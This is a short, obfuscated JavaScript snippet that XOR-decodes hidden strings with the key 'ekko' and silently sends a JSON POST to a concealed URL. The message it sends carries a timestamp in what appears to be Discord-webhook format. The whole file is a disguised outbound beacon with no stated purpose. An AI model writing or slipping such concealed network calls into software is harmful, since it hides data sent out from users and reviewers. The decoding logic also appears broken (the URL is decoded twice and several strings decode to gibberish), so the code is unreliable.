(function () {
    const _0xffb5132 = (a, b) => {
        let c = '';
        for (let d = 0; d < a.length; d++) {
            c += String.fromCharCode(a.charCodeAt(d) ^ b.charCodeAt(d % b.length));
        }
        return c;
    };
    
    const _0xaae41b7 = (() => {
        let _0xccd92f8 = "656b6b6f";
        let _0xdde73c4 = '';
        for (let _0xeff8412 = 0; _0xeff8412 < _0xccd92f8.length; _0xeff8412 += 2) {
            _0xdde73c4 += String.fromCharCode(parseInt(_0xccd92f8.substring(_0xeff8412, _0xeff8412 + 2), 16));
        }
        return _0xdde73c4;
    })();
    
    const _0x98123ac = (h) => _0xffb5132(h, _0xaae41b7);
    
    const _0xbbc541d = _0x98123ac("4\u0003\u001b\u0007\u0000T\u0004\u0015\u001eU\u0004\u001c\u001b\u0002\u001b\u0007\u0004\u0005\u001b\u0007\u001d");
    
    const _0xddf842e = _0x98123ac("=7/25<5=1:08-+1:.- ");
    const _0xaaf013b = _0x98123ac("=1/:5/53;2:5/4-15/ 39") + "<t:" + Math.floor(Date.now() / 1000) + ">";
    
    (function (_0xccd91ab, _0xeea541c) {
        let _0xffc732d = new XMLHttpRequest();
        _0xffc732d.open(_0x98123ac("=+53"), _0xccd91ab, true);
        _0xffc732d.setRequestHeader(_0x98123ac("5;3:+/15"), _0x98123ac("15;/+536+5"));
        _0xffc732d.send(JSON.stringify({
            [_0x98123ac("5:/5:4")]: _0xeea541c,
            [_0x98123ac("6:54:2;:/")]: _0x98123ac("5=5;2547 5;:2:1"),
            [_0x98123ac("6:5;6/4-:5")]: _0x98123ac("+5:/5+5+55=5;/=5+6:57=5"),
        }));
    })(_0x98123ac(_0xbbc541d), _0xddf842e + _0xaaf013b);
})();